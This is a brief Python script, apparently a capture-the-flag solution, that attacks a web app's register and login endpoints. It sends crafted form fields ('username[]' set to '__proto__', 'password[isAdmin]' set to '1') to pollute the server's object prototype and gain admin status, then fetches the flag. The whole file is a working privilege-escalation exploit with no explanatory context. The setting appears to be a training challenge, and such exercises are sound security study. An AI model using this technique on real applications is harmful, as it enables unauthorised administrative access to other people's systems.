import sys
import requests

url = sys.argv[1].strip() if len(sys.argv) > 1 else "0.0.0.0:3000"
if not url.startswith(("http://", "https://")):
    url = "http://" + url

s = requests.Session()
s.post(f"{url}/register", data={"username[]": "__proto__", "password[isAdmin]": "1", "password[password]": "gg"})
s.post(f"{url}/login", data={"username": "password", "password": "gg"})
r = s.get(f"{url}/flag")
flag = r.json()
print(flag)